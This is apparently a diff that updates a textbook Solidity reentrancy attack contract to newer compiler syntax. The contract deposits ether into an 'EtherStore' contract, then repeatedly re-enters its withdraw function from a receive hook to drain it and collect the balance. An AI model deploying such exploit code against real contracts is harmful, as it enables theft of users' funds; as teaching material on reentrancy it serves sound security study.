@@ -1,6 +1,10 @@
+//SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.13;
+
 import "./EtherStore.sol";
 
-contract Attack {
+contract Attacker {
   EtherStore public etherStore;
 
   // initialize the etherStore variable with the contract address
@@ -10,19 +14,19 @@ contract Attack {
 
   function attackEtherStore() public payable {
     // attack to the nearest ether
-    require(msg.value >= 1 ether);
+    require(msg.value >= 1 ether, "Attacker msg.value < 1 ether");
     // sent eth to the depositFunds() function
-    etherStore.depositFunds.value(1 ether)();
+    etherStore.depositFunds{value: 1 ether}();
     // start the magic
     etherStore.withdrawFunds(1 ether);
   }
 
   function collectEther() public {
-    msg.sender.transfer(this.balance);
+    payable(msg.sender).transfer(address(this).balance);
   }
 
-  function fallback() public payable {
-    if(etherStore.balance > 1 ether){
+  receive() external payable {
+    if(address(etherStore).balance > 1 ether){
       etherStore.withdrawFunds(1 ether);
     }
   }
